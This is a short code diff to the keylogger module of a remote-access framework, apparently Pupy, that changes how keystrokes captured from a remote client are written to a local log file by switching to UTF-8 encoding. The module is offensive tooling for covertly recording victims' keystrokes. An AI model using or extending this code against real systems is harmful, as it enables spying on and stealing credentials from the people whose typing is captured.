@@ -10,6 +10,7 @@ import traceback
 import time
 import os
 import datetime
+import codecs
 from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="KeyloggerModule"
@@ -84,9 +85,9 @@ class KeyloggerModule(PupyModule):
             else:
                 filepath=os.path.join("data", "keystrokes","keys_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".log")
                 self.success("dumping recorded keystrokes in %s"%filepath)
-                with open(filepath, 'w') as f:
-                    f.write(data)
                 self.log(data)
+                with codecs.open(filepath, 'w', encoding='utf-8') as f:
+                    f.write(data)
 
         elif args.action=="stop":
             if self.client.is_windows():
